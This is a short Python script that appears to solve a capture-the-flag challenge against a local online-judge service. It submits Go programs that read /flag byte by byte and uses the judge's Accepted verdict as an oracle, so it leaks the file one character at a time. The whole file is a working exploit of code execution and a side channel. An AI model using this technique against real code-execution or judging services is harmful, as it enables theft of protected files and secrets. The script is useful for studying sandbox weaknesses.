import requests


session = requests.Session()
url = "http://localhost:12345/jobs"


flag = ""

payload = """
package main

import (
    "fmt"
    "os"
)

func main() {
    file, _ := os.Open("/flag")
    defer file.Close()

    position := %POSITION%
    file.Seek(int64(position), 0)

    charBuffer := make([]byte, 1)
    file.Read(charBuffer)
    character := rune(charBuffer[0])

    if character == '%GUESS%' {
        fmt.Print("Hello World!")
    } else {
        fmt.Print("Hack for fun")
    }
}
"""


for pos in range(42):
    for guess in '0123456789abcdefgl-{}':
        data = {
            "language": "Go",
            "problem_id": 0,
            "source_code": payload.replace("%POSITION%", str(pos)).replace("%GUESS%", guess),
        }
        resp = session.post(url=url, json=data)
        resp_json = resp.json()

        if resp_json["result"] == "Accepted":
            flag += guess
            print(flag)
            break
